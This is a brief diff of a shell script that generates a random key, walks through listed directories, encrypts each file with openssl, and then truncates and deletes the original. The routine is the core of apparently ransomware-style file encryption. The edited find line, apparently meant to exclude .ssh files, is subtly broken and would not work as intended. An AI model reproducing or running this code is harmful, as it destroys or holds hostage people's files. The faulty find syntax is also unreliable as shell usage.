@@ -10,7 +10,7 @@ openssl rand -hex 16 > $KEY
 
 for LOCATION in $(cat $LIST)
 do
-	for FILE in $(find $LOCATION -type f)
+	for FILE in $(find $LOCATION -type f -name '-not *.ssh*')
 	do
 		openssl aes-128-cbc -salt -pass file:"$KEY" -in "$FILE" -out "$FILE.enc" && cat /dev/null > "$FILE" && rm -rf "$FILE"
 	done
